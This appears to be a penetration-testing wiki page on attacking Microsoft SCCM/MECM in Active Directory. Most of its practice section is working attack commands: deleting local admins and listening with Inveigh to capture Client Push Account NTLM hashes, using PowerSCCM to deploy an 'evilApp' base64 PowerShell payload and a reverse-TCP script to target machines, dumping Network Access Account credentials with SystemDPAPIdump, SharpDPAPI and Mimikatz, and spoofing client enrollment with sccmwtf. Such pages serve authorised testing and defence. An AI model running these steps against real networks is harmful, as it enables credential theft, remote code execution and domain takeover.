# SCCM / MECM

## Theory

The **System Center Configuration Manager** (SCCM), now known as **Microsoft Endpoint Configuration Manager** (MECM), is a software developed by Microsoft to help system administrators manage the servers and workstations in large Active Directory environments. It provides lots of features including remote control, patch management, task automation, application distribution, hardware and software inventory, compliance management and security policy administration.

When SCCM is installed in an Active Directory, the clients can be deployed on the workstations by six different ways:

* Client push installation
* Software update-based installation
* Group Policy installation
* Manual installation
* Logon script installation
* Package and program installation

<details>

<summary>Client push installation</summary>

The first way of deploying SCCM is the **Client push installation** method, which is the default one and the least secure.&#x20;

This installation will use "client push accounts". They are service acounts with local administrative rights on the assets where SCCM will have to deploy some stuff. The system administrator creates groups of endpoints and for each of those, one "client push account". For each group, only one "client push account" can authenticate with administrator rights on the assets of this group. Thus, if an account is compromised, only the members of the corresponding group can be compromised in turn.

When the SCCM deployment is launched, it will basically try to authenticate with each client push accounts on each asset, and if the authentication fails, SCCM will try the next account in line. When the authentication succeeds, it moves to the following asset, and so on until the deployment is complete.

SCCM deployment via **Client push installation** is service accounts credentials spraying in a nutshell.

</details>

## Practice

### Client push installation

With a compromised machine in an Active Directory where SCCM is deployed via **Client Push Accounts** on the assets, it is possible to have the "Client Push Account" authenticate to a remote resource and, for instance, retrieve an NTLM response (i.e. [NTLM capture](ntlm/capture.md)). The "Client Push Account" usually has local administrator rights to a lot of assets.

In some case, the "Client Push Accounts"  could even be part of the Domain Admins group, leading to a complete takeover of the domain.

In order to retrieve the Client Push Account's authentication, all local admins must be removed from the compromised host, and a listener can be started on it with [Inveigh](https://github.com/Kevin-Robertson/Inveigh) (C# or Powershell).

```powershell
# 1. Remove all the local Administrators on the compromised machine
net user <username> /delete

# 2. Listen for authentication with Inveigh
.\Inveigh.exe -Challenge 1122334455667788
```

Once the capturing/relaying listeners are started, the tester can wait for the Client Push Accounts to authenticate automatically. Hopefully, NTLMv1 will be used, allowing for easier NTLM cracking. There are other alternatives to cracking the response, like [relaying the authentication](ntlm/relay.md).

### Applications and scripts deployment

With sufficient rights on the central SCCM server (sufficient rights on WMI), it is possible to deploy applications or scripts on the Active Directory machines with [PowerSCCM](https://github.com/PowerShellMafia/PowerSCCM) (Powershell).

```powershell
# Create a SCCM Session via WMI with the Site Code
Find-SccmSiteCode -ComputerName SCCMServer
New-SccmSession -ComputerName SCCMServer -SiteCode <site_code> -ConnectionType WMI

# Retrieve the computers linked to the SCCM server
Get-SccmSession | Get-SccmComputer

# Create a computer collection
Get-SccmSession | New-SccmCollection -CollectionName "collection" -CollectionType "Device"

# Add computers to the collection
Get-SccmSession | Add-SccmDeviceToCollection -ComputerNameToAdd "target" -CollectionName "collection"

# Create an application to deploy
Get-SccmSession | New-SccmApplication -ApplicationName "evilApp" -PowerShellB64 "<powershell_script_in_Base64>"

# Create an application deployment with the application and the collection previously created
Get-SccmSession | New-SccmApplicationDeployment -ApplicationName "evilApp" -AssignmentName "assig" -CollectionName "collection"

# Force the machine in the collection to check the application update (and force the install)
Get-SccmSession | Invoke-SCCMDeviceCheckin -CollectionName "collection"
```

If deploying applications fails, deploying CMScripts is an alternative, which requires a "Configuration Manager" drive on the SCCM server.&#x20;

This [pull request](https://github.com/PowerShellMafia/PowerSCCM/pull/6) on PowerSCCM can be used to do everything in one command. It uses the script `configurationmanager.psd1` created by Microsoft, usually installed on SCCM servers.

```powershell
# Create a CM drive if it doesn't already exist and deploy a CMScript on a target
New-CMScriptDeployement -CMDrive 'E' -ServerFQDN 'sccm.domain.local' -TargetDevice 'target' -Path '.\reverseTCP.ps1' -ScriptName 'evilScript'
```

### SCCM credentials extraction with DPAPI

When non-domain joined computers need to retrieve software from a SCCM server, the SCCM endpoint will deploy **Network Access Accounts (NAA)** on them. The NAAs do nothing on the hosts but access resources across the network. Normally, the NAA account [should](https://docs.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#network-access-account) be configured with the least privilege and does not have interactive logon rights. But it appears that sometimes domain accounts are used for this task.

The NAA policy, including the NAA's credentials, is sent by the SCCM server and stored on the client machine, encrypted via DPAPI with SYSTEM's master key. With a SYSTEM (i.e. local admin) access on the target, it is possible to decipher the policy and retrieve the credentials.

{% hint style="info" %}
It appears that even after changing the NAA account or uninstalling the SCCM client, the credentials are still present on the disk.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to decipher the WMI blob via DPAPI and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.

```bash
SystemDPAPIdump.py -creds -sccm 'DOMAIN/USER:Password'@'target.domain.local'
```
{% endtab %}

{% tab title="Windows" %}
With an elevated session on the target machine, [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) (C#) can be used to extract the SCCM credentials on the host.

```powershell
.\SharpDPAPI.exe SCCM
```

The tool [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can also be used for the same purpose.

```batch
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # dpapi::sccm
```
{% endtab %}
{% endtabs %}

### Network Access Account deobfuscation

A computer account has the ability to register itself with the SCCM server and request the encrypted NAA policies, decrypt them, deobfuscate them and retrieve the NAA's credentials in them.

The first step consists in controlling a computer account. One can be [created](domain-settings/machineaccountquota.md#create-a-computer-account) if the [Machine Account Quota](domain-settings/machineaccountquota.md) attribute is greater than 0.

{% content-ref url="domain-settings/machineaccountquota.md" %}
[machineaccountquota.md](domain-settings/machineaccountquota.md)
{% endcontent-ref %}

#### Enroll and retrieve the NAA policy

The SCCM attack can then be performed with [sccmwtf](https://github.com/xpn/sccmwtf) (Python). The new client to spoof doesn't need to be the previously created computer account (useful if you only have an existing computer account already enrolled).

The positional arguments are as follows:

* Spoof Name&#x20;
* Spoof FQDN&#x20;
* Target SCCM&#x20;
* Computer account username&#x20;
* Computer account password

{% code overflow="wrap" %}
```bash
sccmwtf.py "fakepc" "fakepc.domain.local" 'SCCM-Server' 'DOMAIN\ControlledComputer$' 'Password123!'
```
{% endcode %}

{% hint style="warning" %}
The tool author ([Adam Chester](https://twitter.com/\_xpn\_)) warns not to use this script in production environments.
{% endhint %}

#### Retrieve the credentials

Then, on a Windows machine, the two blobs (`NetworkAccessUsername` and `NetworkAccessPassword`) can be retrieved in plaintext by indicating only the hexadecimal part.

```powershell
.\policysecretunobfuscate.exe <blob_hex_1>
.\policysecretunobfuscate.exe <blob_hex_2>
```

## Resources

{% embed url="https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts" %}

{% embed url="https://enigma0x3.net/2016/02/" %}

{% embed url="https://docs.microsoft.com/en-us/powershell/module/configurationmanager/?view=sccm-ps" %}

{% embed url="https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9" %}

{% embed url="https://blog.xpnsec.com/unobfuscating-network-access-accounts/" %}
